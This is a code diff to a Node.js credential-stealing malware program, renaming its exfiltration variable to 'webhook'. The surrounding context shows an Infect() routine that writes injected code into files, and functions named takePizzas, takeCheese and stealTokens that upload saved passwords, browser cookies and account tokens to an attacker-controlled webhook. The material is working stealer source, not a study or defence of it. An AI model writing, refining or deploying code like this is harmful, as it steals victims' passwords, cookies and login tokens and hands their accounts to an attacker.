@@ -30,7 +30,7 @@ var debug = false,
 
 if (args[0] == 'debug') debug = false;
 const buf_replace = require('buffer-replace');
-const superstarlmao = "da_webhook"
+const webhook = "da_webhook"
 const config = {
     "logout": "instant",
     "inject-notify": "true",
@@ -140,7 +140,7 @@ function Infect() {
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", superstarlmao).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704", config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
@@ -347,7 +347,7 @@ async function takePizzas() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
-        form.submit(superstarlmao, (error, response) => {
+        form.submit(webhook, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -375,7 +375,7 @@ async function takeCheese() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\cookies.txt"));
-        form.submit(superstarlmao, (error, response) => {
+        form.submit(webhook, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -407,7 +407,7 @@ async function stealTokens() {
         });
     }
 
-    axios.post(superstarlmao, {
+    axios.post(webhook, {
         "content": null,
         "embeds": [
           {
